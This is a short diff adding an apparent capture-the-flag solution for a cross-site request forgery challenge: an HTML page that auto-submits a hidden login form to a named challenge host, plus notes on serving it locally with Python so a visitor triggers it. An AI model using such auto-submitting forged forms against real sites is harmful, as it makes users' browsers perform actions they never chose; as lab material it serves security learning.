@@ -1,0 +1,17 @@
+<html>
+	<body>
+	  <form method=POST action=http://csrf1.adriaan.haxx.be>
+		    <input type=submit name=username value=minions>
+		    <input type=submit name=password value=minions>
+		    </form>
+		  <script>
+		  	document.forms[0].submit();
+		  </script>
+	</body>
+</html>
+
+
+By using this script locally and forcing the attacker to visit the page we can open it later to 
+retrieve the key.
+
+Locally we run python -m SimpleHTTPServer and use our local port 8000
